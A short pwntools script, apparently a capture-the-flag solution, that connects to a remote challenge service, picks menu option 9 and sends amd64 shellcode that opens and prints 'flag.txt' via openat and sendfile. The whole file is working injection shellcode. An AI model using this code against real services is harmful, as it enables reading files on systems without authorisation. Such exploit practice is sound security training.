#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io):
    shellcode = asm("""
                    mov rdi, -100
                    lea rsi, [rip + flag]
                    xor edx, edx
                    xor r10, r10
                    mov eax, 257
                    syscall

                    mov rdi, 1
                    mov rsi, rax
                    mov r10, 64
                    mov eax, 40
                    syscall

                    flag:
                        .string "flag.txt"
    """)
    io.sendlineafter(b"? ", b"9")
    io.send(shellcode)
    flag = io.recvline().decode()
    print(flag)

def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)


if __name__ == "__main__":
    main()
